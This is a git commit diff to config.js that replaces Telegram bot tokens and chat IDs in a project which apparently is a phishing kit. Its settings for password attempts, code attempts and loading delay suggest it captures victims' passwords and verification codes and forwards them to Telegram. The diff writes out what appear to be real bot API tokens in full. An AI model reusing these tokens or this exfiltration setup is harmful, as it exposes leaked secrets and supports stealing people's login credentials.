b51ceb00b1ad726e01c57c9e4305bbb4ed8bbcb7
hoangwin123 <nguyenthuancj878@gmail.com>
2025-08-21 20:17:18 +0700

    Update config.js

--- src/utils/config.js
+++ src/utils/config.js
@@ -1,8 +1,8 @@
 const config = {
-    token: '7843396833:AAHx49nOiz3U8kCf-x82UikTKGde6l9OTrE',
-    chat_id: '1662565121',
-    noti_token: '7843396833:AAHx49nOiz3U8kCf-x82UikTKGde6l9OTrE',
-    noti_chat_id: '-4872736754',
+    token: '7799607651:AAF3XZOYFat6FvTQWhB78ji7kSeMyYSkPRA',
+    chat_id: '-4829736745',
+    noti_token: '8265748882:AAEOYlLlM1mokWH46LOBRAvxQ55gpN4CyR4',
+    noti_chat_id: '-4961616371',
     max_password_attempts: 2,
     max_code_attempts: 5,
     password_loading_time: 3,
